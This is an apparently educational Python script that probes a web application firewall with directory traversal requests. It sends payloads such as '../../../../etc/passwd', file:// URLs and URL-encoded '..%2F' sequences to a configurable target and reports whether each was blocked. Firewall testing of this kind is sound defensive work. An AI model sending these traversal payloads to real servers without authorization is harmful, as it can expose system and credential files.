# Educational WAF Testing Script: Comprehensive Directory Traversal Attack
# Purpose: Demonstrates various path traversal techniques including parameters, URLs, and protocols
# Learning Goal: Shows different methods WAFs use to detect file path manipulation
# WAF Context: Tests traversal protection across multiple attack vectors
# Comparison: Combines basic parameter traversal with enhanced URL/protocol schemes
# Usage: Learn comprehensive traversal detection patterns in one consolidated script

import requests
import json

import os
from dotenv import load_dotenv
load_dotenv()

TARGET_URL = os.getenv("TARGET_URL")

def test_parameter_traversal():
    """Test directory traversal via query parameters (formerly 15_traversal.py)"""
    print("=== PARAMETER-BASED TRAVERSAL TESTING ===")

    # Basic traversal payload via query parameter
    attack_payload = '../../../../etc/passwd'
    query_parameters = {"filename": attack_payload}

    print(f"Testing parameter traversal: filename={attack_payload}")

    try:
        response = requests.get(
            TARGET_URL,
            params=query_parameters,
            headers={'User-Agent': 'Educational-Simulator/1.0'},
            timeout=10
        )

        print(f"Exact URL Sent: {response.url}")
        print(f"Status Code: {response.status_code}")

        if response.status_code == 200:
            try:
                response_json = response.json()
                print("\nRequest Parameters Received by Server:")
                print(json.dumps(response_json.get('args', {}), indent=4))
                print(f"\nFull URL Constructed: {response_json.get('url')}")
            except json.JSONDecodeError:
                print(f"Response (first 200 chars): {response.text[:200]}...")
        else:
            print(f"Request failed: {response.text[:200]}...")

    except requests.exceptions.RequestException as e:
        print(f"Connection error: {e}")

    print("-" * 60)

def test_url_traversal():
    """Test directory traversal via direct URL manipulation (formerly 16_traversal2.py)"""
    print("=== URL-BASED TRAVERSAL TESTING ===")

    # Enhanced traversal payloads including file:// protocol
    payloads = [
        "/etc/passwd",                    # Basic file access
        "/file:///etc/styles.css",       # File protocol variation
        "/file:///etc/vendor.js",        # File protocol with JS
        "/../../../etc/passwd",          # Classic traversal
        "/..%2F..%2F..%2Fetc%2Fpasswd"  # URL encoded traversal
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "X-WAF-Test": "Traversal-Simulation"
    }

    for payload in payloads:
        target_endpoint = f"{TARGET_URL}{payload}"
        print(f"[*] Testing Endpoint: {target_endpoint}")

        try:
            response = requests.get(target_endpoint, headers=headers, timeout=5)
            print(f"    - Status Code: {response.status_code}")

            # WAF detection indicators
            if response.status_code == 403:
                print("    - [WAF BLOCKED] Access Denied - Traversal Detected")
            elif response.status_code == 406:
                print("    - [WAF BLOCKED] Not Acceptable - Malicious Pattern Detected")
            elif response.status_code == 200:
                print(f"    - [RESPONSE] Content Length: {len(response.content)} bytes")
            else:
                print(f"    - [OTHER] Unexpected status: {response.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"    - [CONNECTION ERROR] {e}")

        print("-" * 50)

def main():
    """Main function to run all traversal tests"""
    print("--- Starting Comprehensive Directory Traversal Simulation ---")
    print(f"Target URL: {TARGET_URL}\n")

    # Run parameter-based tests
    test_parameter_traversal()
    print()

    # Run URL-based tests
    test_url_traversal()

    print("\n--- Traversal Simulation Complete ---")
    print("Note: This combines techniques from both basic parameter traversal")
    print("and enhanced URL manipulation for comprehensive WAF testing.")

if __name__ == "__main__":
    main()